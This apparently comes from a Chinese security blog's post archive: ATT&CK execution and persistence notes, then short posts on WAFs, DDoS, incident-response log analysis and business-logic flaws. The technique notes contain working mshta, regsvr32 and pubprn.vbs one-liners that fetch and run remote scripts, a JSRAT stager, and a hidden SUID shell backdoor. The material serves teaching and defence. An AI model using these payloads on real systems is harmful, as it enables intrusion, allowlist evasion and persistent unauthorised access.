是与操作系统交互的常见方式。攻击者可以在操作期间通常通过远程交互式会话（如远程桌面协议）使用系统的 GUI。 0X2.10 InstallUtilInstaller工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源 利用白名单绕过360实例利用白名单绕过限制的更多测试 0X2.11 LSASS 驱动程序本地安全权威 (Local Security Authority, LSA) 是负责本地安全策略和用户身份验证的主要组件。 LSA 包括与各种其他安全功能相关联的多个动态链接库 (DLL)，所有这些功能都在 LSA 子系统服务 (LSASS) lsass.exe 上下文中运行。 配置其他LSA保护监控密码过滤器DLL 0X2.12 本地作业调度在 Linux 和 macOS 系统上，有多种方法可以创建预定的和周期性的后台作业：cron、at、 和 launchd 利用定时任务来执行脚本。linux定时任务at，batch和crontab 0X2.13 mshta攻击者可以使用 mshta.exe 通过受信任的 Windows 实用程序代理执行恶意。hta 文件和 Javascript 或 VBScript。 常见的mshta利用方法: 1mshta http:&#x2F;&#x2F;192.168.3.1&#x2F;run.hta run.hta 内容如下： 123456789101112131415&lt;HTML&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;&lt;HEAD&gt; &lt;script language&#x3D;&quot;VBScript&quot;&gt;Window.ReSizeTo 0, 0Window.moveTo -2000,-2000Set objShell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)objShell.Run &quot;cmd.exe &#x2F;c net user&quot; &#x2F;&#x2F; 这里填写命令self.close&lt;&#x2F;script&gt;&lt;body&gt;demo&lt;&#x2F;body&gt;&lt;&#x2F;HEAD&gt; &lt;&#x2F;HTML&gt; mshta是用来执行hta文件的，经过测试发现，其实没有hta文件，也可以通过mshta来执行命令的，经过几次测试发现mshta不仅可以使用vbscript，而且可以使用javascript来执行命令，整理payload如下： VBSCRIPT EXEC 1mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close) JAVASCRIPT EXEC 1mshta javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b&#x3D;h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im mshta.exe&quot;,0,true);&#125; JSRAT 1mshta javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.2.101:9998&#x2F;connect&quot;,false);try&#123;h.Send();b&#x3D;h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im mshta.exe&quot;,0,true);&#125; 0X2.14 PowerShellPowerShell 是 Windows 操作系统中一个强大的交互式命令行界面和脚本环境。 攻击者可以使用 PowerShell 执行许多操作，包括披露信息和执行代码。示例包括可以运行可执行文件的 Start-Process cmdlet 和在本地或远程计算机上运行命令的 Invoke-Command cmdlet。PowerShell 还可以用于从 Internet 下载和运行可执行文件，这些文件可以从磁盘或内存中（无需接触磁盘）执行，使用 PowerShell 连接远程系统需要管理员权限。目前已有许多基于 PowerShell 的攻击测试工具，包括 Empire、PowerSploit、 和 PSAttack。 0X2.15 rundll32可以调用 rundll32.exe 程序来执行任意二进制文件. Use SCT 1regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;urlto&#x2F;calc.sct scrobj.dll calc.sct: 12345678910111213141516171819202122232425262728293031323334353637&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;&lt;scriptlet&gt; &lt;registration description&#x3D;&quot;Empire&quot; progid&#x3D;&quot;Empire&quot; version&#x3D;&quot;1.00&quot; classid&#x3D;&quot;&#123;20001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt; &lt;!-- regsvr32 &#x2F;s &#x2F;i&quot;C:\\Bypass\\Backdoor.sct&quot; scrobj.dll --&gt; &lt;!-- regsvr32 &#x2F;s &#x2F;i:http:&#x2F;&#x2F;server&#x2F;Backdoor.sct scrobj.dll --&gt; &lt;!-- That should work over a proxy and SSL&#x2F;TLS... --&gt; &lt;!-- Proof Of Concept - Casey Smith @subTee --&gt; &lt;script language&#x3D;&quot;JScript&quot;&gt; &lt;![CDATA[ var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); ]]&gt;&lt;&#x2F;script&gt;&lt;&#x2F;registration&gt; &lt;public&gt; &lt;method name&#x3D;&quot;Exec&quot;&gt;&lt;&#x2F;method&gt;&lt;&#x2F;public&gt;&lt;script language&#x3D;&quot;JScript&quot;&gt;&lt;![CDATA[ function Exec() &#123; var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;); &#125; ]]&gt;&lt;&#x2F;script&gt; &lt;&#x2F;scriptlet&gt; 更多使用方法查看如下文章:rundll32使用 关于利用rundll32执行程序的分析AppLocker绕过– Rundll32 0X2.16 REGSVR32Regsvr32.exe 是一个命令行程序，用于在 Windows 系统上注册和取消注册对象链接和嵌入控件，包括动态链接库 (DLLs)。 Regsvr32.exe 可用于执行任意二进制文件。 1regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.3.1&#x2F;test.data scrobj.dll test.data内容： 123456789101112131415&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid&#x3D;&quot;ShortJSRAT&quot; classid&#x3D;&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language&#x3D;&quot;JScript&quot;&gt; &lt;![CDATA[ ps &#x3D; &quot;cmd.exe &#x2F;c calc.exe&quot;; new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true); ]]&gt;&lt;&#x2F;script&gt;&lt;&#x2F;registration&gt;&lt;&#x2F;scriptlet&gt; 还可以利用 https://github.com/CroweCybersecurity/ps1encode 生成sct(COM scriptlet - requires a webserver to stage the payload) 1regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.3.1&#x2F;test.sct scrobj.dll AppLocker Bypass – Regsvr32 0X2.17 Regsvcs/RegasmRegasm和Regsvcs都是用于向COM对象注册程序集文件的Microsoft二进制文件。 这些二进制文件可以在.NET框架中找到，并且由于它们是可信的，所以这两个Microsoft实用程序可以用于绕过AppLocker限制和执行任意代码。 绕过AppLocker系列之Regasm和Regsvcs的利用 0X2.18 Windows 任务计划程序诸如 at 和 schtasks 之类的实用程序以及 Windows 任务计划程序可以安排在指定日期和时间执行的程序或脚本。 WINDOWS计划任务命令schtasks详解 0X2.19 脚本攻击者可以使用脚本来帮助操作并执行多个操作，否则需要手动执行这些操作 0X2.20 服务执行攻击者可以通过与 Windows 服务交互的方法（例如服务控制管理器）执行二进制文件，命令或脚本 0X2.21 签名的二进制代理执行具有可信数字证书签名的二进制文件可以在受数字签名验证保护的 Windows 系统上执行。 Windows 安装中默认的几个 Microsoft 签名二进制文件可以用于代理其他文件的执行。 攻击者可能会滥用此行为来执行恶意文件，从而绕过系统上的应用程序白名单和签名验证。 该技术考虑了在现有技术中尚未考虑的代理执行方法。 Mavinject.exeMavinject.exe 是一个允许代码执行的 Windows 实用程序。 可以使用 Mavinject 将 DLL 注入到正在运行的进程中。 1&quot;C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe&quot; &#x2F;INJECTRUNNING C:\\Windows\\system32\\mavinject.exe &#x2F;INJECTRUNNING SyncAppvPublishingServer.exe SyncAppvPublishingServer.exe 可以在不执行 powershell.exe 的情况下运行 powershell 脚本。 存在其他若干个可用于执行类似行为的二进制文件。Mavinject | Dll Injected 0X2.22 签名脚本代理执行具有可信证书签名的脚本可用于代理恶意文件的执行。 这种行为可能会绕过签名验证限制和不考虑这些脚本的应用程序白名单解决方案。 由 Microsoft 签名的 PubPrn.vbs 可用于代理远程站点的执行。示例命令： 1cscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]&#x2F;&#x2F;192.168.1.100&#x2F;hi.png 还有一些其他签名脚本可以以类似的方式使用。 利用详情: 利用script和scriptlet moniker绕过脚本白名单限制 0X2.23 Sourcesource命令通常用于重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。 攻击者可以用它来执行任意后缀形式的可执行文件。 source的使用方法: 12source filename . filename（中间有空格） 0X2.24文件名后的空格攻击者可以通过更改文件的扩展名来隐藏程序的真正文件类型。对于某些文件类型（特别地，对于拓展名。app 并不适用），在文件名后面追加一个空格将改变操作系统处理该文件的方式。 然后当用户双击时，真正的文件类型取决于操作系统，文件会被恰当处理，同时对应的二进制文件将被执行 。 0X2.25第三方软件在网络环境中可以使用第三方应用程序和软件部署系统来管理（例如，SCCM、VNC、HBSS、Altiris 等）。如果攻击者获得对这些系统的访问权，那么他们可能能够执行代码。 0X2.26 TrapTrap 命令的格式如下：trap“命令列表”signals，当接收时到“signals”，将执行“命令列表”。 0X2.27受信任的开发人员工具有许多用于软件开发相关工作的实用程序可以用来以多种形式执行代码，以帮助开发、调试和逆向工程。 MSBuildMSBuild.exe (Microsoft Build Engine) 是 Visual Studio 使用的软件构建平台。 它使用 XML 格式的项目文件，这些文件定义了构建各种平台和配置的需求。 攻击者可以使用 MSBuild 通过受信的 Windows 实用程序代理代码的执行。 .NET 版本 4 中引入的 MSBuild 的内联任务功能允许将 c#代码插入到 XML 项目文件中。 内联任务 MSBuild 将编译并执行内联任务。 MSBuild.exe 是由 Microsoft 签名的二进制文件，因此当以这种方式使用它时，可以执行任意代码并绕过配置为允许 MSBuild.exe 的应用程序白名单防御。 DNX.NET 执行环境 (DNX)， DNX.exe 是随 Visual Studio Enterprise 打包的软件开发工具包。 它在 2016 年被淘汰，取而代之的是。NET Core CLI 。 DNX 不存在于 Windows 的标准版本中，并且可能只存在于使用旧版。NET Core 和 ASP.NET Core 1.0 的开发人员工作站上。 可执行文件 dnx.exe 由 Microsoft 签名。 攻击者可以使用 DNX. exe 代理执行任意代码，以绕过允许 DNX 执行的应用程序白名单策略。 RCSI Rcsi.exe 实用程序是用于 c#的非交互式命令行接口，类似于 csi.exe。 Roslyn.net 编译器平台的早期版本提供 Rcsi.exe，但是在集成解决方案中弃用了。 rcsi.exe 由 Microsoft 签名。 在命令行上使用 rcsi.exe 编写和执行 c# .csx 脚本文件。 攻击者可以使用 rcsi.exe 来代理执行任意代码，从而绕过允许 rcsi.exe 执行的应用程序白名单策略。 WinDbg /CDBWinDbg 是一个 Microsoft Windows 内核和用户模式调试工具。Microsoft Console Debugger (CDB) cdb.exe 也是用户模式调试器。 这两个实用程序都在 Windows 软件开发工具包中，可以作为独立的工具使用。它们通常用于软件开发和逆向工程，在典型的 Windows 系统中可能找不到。 WinDbg.exe 和 cdb.exe 都是由 Microsoft 签名的。攻击者可以使用 WinDbg.exe 和 cdb.exe 来代理任意代码的执行，从而绕过允许这些实用程序执行的应用程序白名单策略。 其他调试器也可以用于类似的目的，比如内核模式调试器 kd.exe，它也由 Microsoft 签名。 Tracker文件跟踪器 tracker.exe，作为 MSBuild 的一部分包含在。NET 框架中。它用于记录对 Windows 文件系统的调用。 攻击者可以利用 tracker.exe 将任意 DLL 的执行代理到其他进程中。 tracker.exe 也具有签名，因此可以使用它来绕过应用程序白名单解决方案。 0X2.28用户执行攻击者可以依靠用户的特定操作来获得执行。 这可以是直接代码执行，例如当用户打开鱼叉式钓鱼附件 (Spearphishing Attachment) 传递的恶意可执行文件时，该文件带有图标和文档的明显文件扩展名。 它还可能导致其他执行技术，例如当用户单击通过鱼叉式钓鱼链接 (Spearphishing Link) 传递的链接，从而通过客户端执行利用（Exploitation for Client Execution）实现对浏览器或应用程序的漏洞利用。 虽然用户执行 (User Execution) 通常发生在初始访问（Initial Access）不久之后，但也可能发生在入侵的其他阶段，例如当攻击者将文件放置在共享目录中或用户桌面，希望用户单击它时。 0X2.29Windows 管理规范Windows 管理规范 (WMI) 是 Windows 管理的一个功能，它为本地和远程访问 Windows 系统组件提供了统一的环境。它依赖于本地和远程访问的 WMI 服务以及远程访问的服务器消息块（SMB） 和远程过程调用服务（RPCS）。RPC 在 135 端口上运行。 攻击者可以使用 WMI 与本地和远程系统进行交互，并将其用作执行许多策略功能的手段，例如收集发现的信息和远程执行文件，作为横向移动的一部分。 0X2.30Windows 远程管理Windows 远程管理（WinRM）代表允许用户与远程系统交互的 Windows 服务和协议（例如，运行可执行文件，修改注册表，修改服务）。 winrm 命令和很多程序（如 PowerShell）都可以调用它。 一条命令实现端口复用后门 0X2.31XSL 脚本处理可扩展样式表语言 (XSL) 文件通常用于描述 XML 文件中的数据处理和渲染方式。 为了支持复杂的操作，XSL 标准包括对各种语言的嵌入式脚本的支持。 0x3持久化持久化是指任何对系统的访问，操作或配置更改，使攻击者在该系统上持续地存在。攻击者通常需要通过中断来维持对系统的访问，例如系统重启，凭据丢失或其他需要远程访问工具重新启动或备用后门才能重新获得访问权限的故障。 0x3.1.bash_profile 和.bashrc在打开新 shell 或用户登录时，会在用户的上下文中执行/.bash_profile 和/.bashrc ，以便正确设置其环境。 ~/.bash_profile 用于登录 shell，而 ~/.bashrc 在交互式非登录 shell 中执行。 攻击者恶意的脚本写入.bash_profile 或.bashrc，每次打开新 shell 或用户登录时，恶意脚本再次执行，实行持久化控制。 详情可看此篇文章.关于“.bash_profile”和“.bashrc”区别的总结 0x3.2辅助功能Windows 包含可在用户登录前使用组合键启动的辅助功能（例如，当用户在 Windows 登录屏幕上时）。攻击者可以修改这些程序的启动方式，以获取命令提示符或后门而无需登录系统。 两个常用的辅助功能程序，C:\\Windows\\System32\\sethc.exe 按下五次 Shift 键启动。C:\\Windows\\System32\\utilman.exe 按下 Windows + U 组合键启动。sethc.exe 程序通常被称为“粘性密钥”，并且已被攻击者用于通过远程桌面登录屏幕进行未经身份验证的访问。 12345屏幕键盘： C:\\Windows\\System32\\osk.exe放大镜： C:\\Windows\\System32\\Magnify.exe旁白： C:\\Windows\\System32\\Narrator.exe显示切换器：C:\\Windows\\System32\\DisplaySwitch.exeApp 切换器： C:\\Windows\\System32\\AtBroker.exe 0x3.3账户操作帐户操作可以帮助攻击者维持对环境中的凭据和特定权限级别的访问权限。操作可以包括修改权限、修改凭据、添加或更改权限组、修改帐户设置或修改身份验证的执行方式。这些操作还可以包括旨在破坏安全策略的帐户活动，例如重复更新密码来破坏有关密码持续时间的策略并保持已盗取凭据的有效性。 0x3.4AppCert DLL注册表键 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager 中的 AppCertDLLs 值指定的动态链接库 (DLL) 会被加载到每个调用常用的应用程序编程接口 (API) 函数的进程中： 1234CreateProcessCreateProcessAsUserCreateProcessWithLoginWCreateProcessWithTokenW 类似于进程注入，攻击者可以滥用该值，通过使恶意 DLL 被加载并在计算机上独立进程的上下文中运行，实现持久化和特权升级。 0x3.5AppInit DLL注册表键值 AppInit_DLLs 位于 1HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows或 HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows。 它所指向的动态链接库（DLL）都会加载到每个使用到 User32.DLL 的进程实际上，这几乎等同于所有程序。因为 user32.dll 是一个十分常见的库。类似于进程注入，攻击者可以滥用这些值，通过使恶意 DLL 被加载并在计算机上独立进程的上下文中运行，实现持久化和特权升级。在 Windows 8 和更高版本中开启安全引导 (secure boot) 模式时，AppInit DLL 功能会被禁用。 0x3.6应用 Shimming创建 Microsoft Windows 应用程序兼容性基础架构/框架 (Application Shim) 是为了在操作系统代码库随时间变化的同时保持软件的向后兼容性。 例如，应用程序 shimming 特性允许开发人员将补丁应用于为 Windows XP 创建的应用程序（不需要重新编写代码），这样它就可以兼容 Windows 10。 为了保证 shim 的安全，Windows 将它们设为在用户模式下运行，这样它们就无法修改内核，您必须具有管理员权限才能安装 shim 。 但是，某些 shim 可以用来绕过用户帐户控制 (UAC) (RedirectEXE)、将 DLL 注入进程 (InjectDLL)、禁用数据执行保护 (DisableNX) 和结构异常处理 (DisableSEH) 以及截获内存地址 (GetProcAddress)。 与 hook 类似，使用这些 shim 可能允许攻击者执行一些恶意行为，如提升权限、安装后门、禁用如 Windows Defender 的防御等。 渗透测试中的应用程序兼容性片 0x3.7身份验证包Windows 身份验证包 DLL 在系统启动时由本地安全机构（LSA）进程加载。 它们支持操作系统的多登录过程和多安全协议。 攻击者可以使用 LSA 身份验证包提供的自动启动机制来实现持久化，方法是在 Windows 注册表 HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\位置放置对二进制文件的引用，该键值为”Authentication Packages”=。在加载身份验证包时，系统将执行该二进制文件。 0x3.8BITS 作业Windows 后台智能传输服务 (BITS) 是一种低带宽、异步的文件传输机制，通过组件对象模型 (COM) 供外部调用。可以通过 PowerShell 和 BITSAdmin 工具访问创建和管理 BITS 作业的接口。 攻击者可能会滥用 BITS 来下载、执行，甚至在运行恶意代码后清理痕迹。 BITS 任务在 BITS 作业数据库中是自包含的，不需要新文件或修改注册表，而且通常被主机防火墙允许。 了 BITS 启用执行还可以通过创建长期作业（默认最大生存期为 90 天，可延长）或在作业完成或出现错误（包括系统重新启动后）时调用任意程序来实现持久化 (Persistence )。 利用详情可看Persistence – BITS Jobs 0x3.9Bootkitbootkit 是一种恶意软件变体，它修改硬盘驱动器的引导扇区，包括主引导记录 (MBR) 和卷引导记录 (VBR)。 攻击者可以使用 bootkits 在操作系统下面的层上的系统上持久存在，这可能使得难以执行全面的补救，除非组织怀疑使用的 bootkit 并且可以相应地采取行动。­ 主引导记录MBR 是 BIOS 完成硬件初始化后首先加载的磁盘部分。它是引导加载程序的位置。对引导驱动器有原始访问权限的攻击者可能会覆盖此区域，从而在启动期间将执行从正常的引导加载程序转移到攻击者代码。 卷引导记录MBR 将引导过程的控制权传递给 VBR。与 MBR 的情况类似，具有对引导驱动器的原始访问权限的攻击者可能会覆盖 VBR 以将启动期间的执行转移到攻击者代码。 0x3.10浏览器扩展恶意扩展可以通过伪装成合法扩展的恶意应用程序商店下载文件、通过社会工程或经由已经成功攻击系统的攻击者安装到浏览器中。 浏览器应用程序商店的安全性可能受到限制，因此恶意扩展绕过自动扫描程序并上传可能并不困难。 扩展安装完成后，它可以在后台浏览网站， 窃取用户输入到浏览器的所有信息，包括凭证 ，并作为 RAT 病毒的安装程序用于持久化 Chrome插件(扩展)开发全攻略 0x3.11更改默认文件关联打开文件时，系统将检查用于打开文件的默认程序（也称为文件关联或处理程序）文件关联选择存储在 Windows 注册表中，可以由具有注册表访问权限的用户、管理员或 程序编辑，也可以由使用内置 assoc 实用程序的管理员编辑。 0x3.12组件固件攻击者可以使用多个具有不同命令与控制协议的远程访问工具来规避检测 。 0x3.13组件对象模型劫持组件对象模型 (COM) 是 Windows 中的一个系统，它支持软件组件之间通过操作系统交互。 攻击者可以使用该系统插入恶意代码，这些代码可以通过劫持 COM 引用和关系作为持久化的手段来代替合法软件执行。 劫持 COM 对象需要更改 Windows 注册表，以替换对合法系统组件的引用，这可能导致该组件在执行时无法正常工作。 当该系统组件通过正常的系统操作执行时，攻击者的代码将被执行。 攻击者很可能劫持那些经常使用的对象，以保持一致的持久性，但不太可能破坏系统中的明显功能，避免系统不稳定而触发检测。 通过COM组件IFileOperation越权复制文件通过COM组件NetFwPolicy2越权关闭防火墙通过COM组件IARPUninstallStringLauncher绕过UAC 0x3.14创建账户具有足够访问级别的攻击者可以创建本地系统或域帐户。 这些帐户可用持久化，不需要在系统上部署持久远程访问工具。 net user 命令可用于创建本地或域帐户。 0x3.15 DLL 搜索顺序劫持Windows 系统使用常见方法来查找需要加载到程序中的 DLL。 攻击者可以利用 Windows DLL 搜索顺序和未明确指明 DLL 的程序来提权和持久化攻击。 0x3.16外部远程服务诸如 vpn、Citrix 等远程服务和其他访问机制允许用户从外部连接到企业内部的网络资源。 攻击者可以使用远程服务来获取对网络的访问权并维持访问权限。 0x3.17 Setuid和Setgid在Linux或macOS上为应用程序设置setuid或setgid位时，这意味着该应用程序将分别以拥有用户或组的特权运行。 Suid shell是一种可用于以拥有者权限运行的shell，如果拥有者是root那么任何运行了这个shell的用户便可以控制整个系统，如增加用户、修改root口令、清除日志等等。 root权限下执行 12cp &#x2F;bin&#x2F;bash &#x2F;.testchmod 4755 &#x2F;.test 这个放的目录要尽可能隐蔽，最好是子子子目录然后找一个相似的命名。 切换普通用户 1&#x2F;.test 不过bash2针对suid做了一些措施 加个参数就行 1&#x2F;.test -p SUID Executables 参考文章 AppLocker Bypass – CMSTP CHM渗透：从入门到“入狱” 绕过AppLocker系列之控制面板的利用 Windows执行命令与下载文件总结 绕过AppLocker系列之Regasm和Regsvcs的利用 利用script和scriptlet moniker绕过脚本白名单限制","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"ATT&CK","slug":"ATT-CK","permalink":"https://blog.cfyqy.com/tags/ATT-CK/"}],"author":"ye1s"},{"title":"WAF浅析","slug":"WAF浅析","date":"2019-11-14T03:09:00.000Z","updated":"2020-04-13T07:37:07.000Z","comments":true,"path":"article/42c91b11.html","link":"","permalink":"https://blog.cfyqy.com/article/42c91b11.html","excerpt":"","text":"详情可看此篇文章:WAF攻防研究之四个层次Bypass WAF 参考文章: WAF攻防研究之四个层次Bypass WAF https://weibo.com/ttarticle/p/show?id=2309404007261092631700","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"WAF","slug":"WAF","permalink":"https://blog.cfyqy.com/tags/WAF/"}],"author":"ye1s"},{"title":"DDOS","slug":"DDOS","date":"2019-11-13T10:28:00.000Z","updated":"2019-11-13T10:34:24.896Z","comments":true,"path":"article/c72266ee.html","link":"","permalink":"https://blog.cfyqy.com/article/c72266ee.html","excerpt":"DDOS(Distributed Denial of Service)，又称分布式拒绝服务攻击。骇客通过控制多个肉鸡或服务器组成的僵尸网络，对目标发送大量看似合法请求，从而占用大量网络资源，瘫痪网络，阻止用户对网络资源的正常访问。","text":"DDOS(Distributed Denial of Service)，又称分布式拒绝服务攻击。骇客通过控制多个肉鸡或服务器组成的僵尸网络，对目标发送大量看似合法请求，从而占用大量网络资源，瘫痪网络，阻止用户对网络资源的正常访问。 详情可看如下文章: DDOS攻击方式总结DDOS原理与防御 参考文章: DDOS攻击方式总结 https://www.secpulse.com/archives/64088.html","categories":[{"name":"网络通信","slug":"网络通信","permalink":"https://blog.cfyqy.com/categories/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/"}],"tags":[{"name":"DDOS","slug":"DDOS","permalink":"https://blog.cfyqy.com/tags/DDOS/"}],"author":"ye1s"},{"title":"应急响应","slug":"急响应","date":"2019-11-11T17:13:00.000Z","updated":"2019-11-12T02:19:13.041Z","comments":true,"path":"article/587e8742.html","link":"","permalink":"https://blog.cfyqy.com/article/587e8742.html","excerpt":"当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失.","text":"当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失. 常见的应急响应事件分类： web入侵：网页挂马、主页篡改、Webshell系统入侵：病毒木马、勒索软件、远控后门网络攻击：DDOS攻击、DNS劫持、ARP欺骗 具体可查看如下两篇文章: Windows 系统安全事件应急响应 应急响应实战笔记 整理的思维导图: Linux账户查询特权用户特权用户(uid 为0) 1[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd 查询可以远程登录的帐号信息 1[root@localhost ~]# awk &#39;&#x2F;\\$1|\\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 1[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot; 禁用或删除多余及可疑的帐号 12345usermod -L user禁用帐号，帐号无法登录，&#x2F;etc&#x2F;shadow第二栏为!开头userdel user 删除user用户userdel -r user 将删除user用户，并且将&#x2F;home目录下的user目录一并删除 开机启动系统运行级别示意图 12345678运行级别 含义0 关机1 单用户模式，可以想象为windows的安全模式，主要用于系统修复2 不完全的命令行模式，不含NFS服务3 完全的命令行模式，就是标准字符界面4 系统保留5 图形模式6 重启动 日志分析定位有多少IP在爆破主机的root帐号： 1grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破： 1grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c 爆破用户名字典是什么？ 12grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print&quot;$1\\n&quot;;&#125;&#39;|uniq -c|sort -nr 登录成功的IP有哪些： 1grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP： 1grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; 参考文章: 应急响应实战笔记:https://blog.cfyqy.com/pdf/tools/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0.pdf","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://blog.cfyqy.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"https://blog.cfyqy.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"ye1s"},{"title":"业务逻辑漏洞","slug":"务逻辑漏洞","date":"2019-10-11T01:58:00.000Z","updated":"2020-04-13T07:38:35.000Z","comments":true,"path":"article/eb6bdd2c.html","link":"","permalink":"https://blog.cfyqy.com/article/eb6bdd2c.html","excerpt":"由于程序逻辑不严谨或逻辑太过复杂，导致一些逻辑分支不能正常处理或处理错误，统称为 业务逻辑漏洞","text":"由于程序逻辑不严谨或逻辑太过复杂，导致一些逻辑分支不能正常处理或处理错误，统称为 业务逻辑漏洞 关注重点 业务流程 HTTP/HTTPS 请求分析 详情可看此篇https://github.com/PyxYuYu/MyBlog/issues/102 订单任意金额修改相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。 预防思路： 订单需要多重效验 订单数值较大的时候需要人工审核 验证码回传漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件 预防思路： response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加 如果要进行前端验证的话也可以，但是需要进行加密 未进行登陆凭证验证有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没验证ID或cookie验证导致越权。 预防思路： 对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证 接口无限制枚举 某电商登陆接口无验证导致撞库 某招聘网验证码无限制枚举 某快递公司优惠券枚举 某电商会员卡卡号枚举 预防思路： 在输入接口设置验证，如token，验证码等。如果设定验证码，最好不要单纯的采取一个前端验证，最好选择后端验证。如果设定token，请确保每个token只能采用一次，并且对token设定时间参数。 注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。 验证码不要用短数字，尽量6位以上，最好是以字母加数字进行组合，并且验证码需要设定时间期限。 优惠券，VIP卡号请尽量不要存在规律性和简短性，并且优惠券最好是以数字加字母进行组合。 cookie设置存在缺陷 Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举. cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证 用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法 越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限 预防思路 cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。 用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。 用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。 